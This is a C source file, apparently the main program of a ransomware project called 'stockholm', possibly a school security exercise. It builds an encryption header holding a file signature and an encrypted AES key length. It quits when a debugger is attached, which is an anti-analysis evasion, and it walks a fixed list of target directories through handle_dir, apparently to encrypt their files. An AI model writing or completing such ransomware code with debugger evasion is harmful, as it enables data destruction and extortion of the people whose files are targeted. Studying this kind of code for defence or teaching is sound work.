#include "stockholm.h"

void init_stockholm_header(fa_t_env *env)
{
	// Set the file signature
	memcpy(env->g_stockhlm_header.signature, FA_SIGNATURE, FA_MAGICNBR_SIZE);
	// Set the size of the encrypted AES key
	env->g_stockhlm_header.encrypted_key_len = FA_ENCRYPT_KEY_SIZE;
}

int main(int argc, char *argv[])
{
	if (pc_is_debugger_attached())
	{
		printf("Debugger detected. Exiting...\n");
		return 0; // Exit if a debugger is detected
	}

	static fa_t_env	env;

	// const char *process_name = "zsh";
	// if (pc_is_process_running(process_name)) {
	// 	printf("The process '%s' is running. Exiting...\n", process_name);
	// 	return 0;
	// }

	// Parse the arguments given through the commannd line
	fa_parse_argv(&env, argc, argv);

	// Init the header that will be placed at the top of the file
	init_stockholm_header(&env);

	// Declare the injection target directory paths
	char *target_dir_paths[FA_TARGET_ARRAY_SIZE] = FA_TARGET_PATHS;

	// Open each target directory one by one
	for (size_t i = 0; i < FA_TARGET_ARRAY_SIZE; ++i)
		handle_dir(&env, target_dir_paths[i]);
}
